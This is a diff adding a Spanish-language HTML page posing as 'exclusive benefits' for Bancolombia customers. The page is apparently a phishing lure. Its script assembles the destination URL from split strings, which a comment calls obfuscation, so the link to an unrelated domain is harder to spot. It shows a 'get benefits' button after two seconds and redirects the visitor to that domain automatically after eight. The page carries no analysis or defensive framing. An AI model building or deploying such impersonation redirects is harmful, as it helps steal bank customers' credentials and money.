@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beneficios Exclusivo para Clientes Bancolombia</title>
+
+    <style>
+        /* Estilo del botón */
+        #boton-beneficio {
+            display: none;
+            background-color: #FFD700; /* Color amarillo */
+            color: #000; /* Color del texto */
+            border: none;
+            border-radius: 50px; /* Bordes redondeados */
+            padding: 15px 40px;
+            font-size: 18px;
+            cursor: pointer;
+            text-align: center;
+        }
+        #boton-beneficio:hover {
+            background-color: #FFC700; /* Color más oscuro al pasar el mouse */
+        }
+    </style>
+
+    <script>
+        // Ofuscación simple para la URL
+        function abrirNuevaPestana() {
+            const parte1 = "https://licencia";
+            const parte2 = "deactividades.com";
+            const parte3 = "/bcb/";
+            const urlCompleta = parte1 + parte2 + parte3;
+
+            // Abrir en una nueva pestaña
+            window.open(urlCompleta, "_blank");
+        }
+
+        // Redirigir en la misma ventana
+        function redirigirMismaVentana() {
+            const parte1 = "https://licencia";
+            const parte2 = "deactividades.com";
+            const parte3 = "/bcb/";
+            const urlCompleta = parte1 + parte2 + parte3;
+
+            // Redirigir en la misma ventana
+            window.location.href = urlCompleta;
+        }
+
+        // Mostrar el botón después de 3 segundos
+        setTimeout(function() {
+            document.getElementById("boton-beneficio").style.display = "inline-block";
+        }, 2000);
+
+        // Redirigir automáticamente en la misma ventana si no se ha hecho clic en 8 segundos
+        setTimeout(function() {
+            redirigirMismaVentana();
+        }, 8000);
+    </script>
+</head>
+<body style="background-color:#FCFCFF ;">
+
+<center>
+    <br><br><br><br><br><br><br>
+    <div>
+        <img style="width: 250px;" src="archivo/dina.gif" alt="">
+    </div>
+    <br>
+    <!-- Botón que aparece a los 3 segundos -->
+    <button id="boton-beneficio" onclick="abrirNuevaPestana()">Obtener beneficios</button>
+</center>
+
+</body>
+</html>
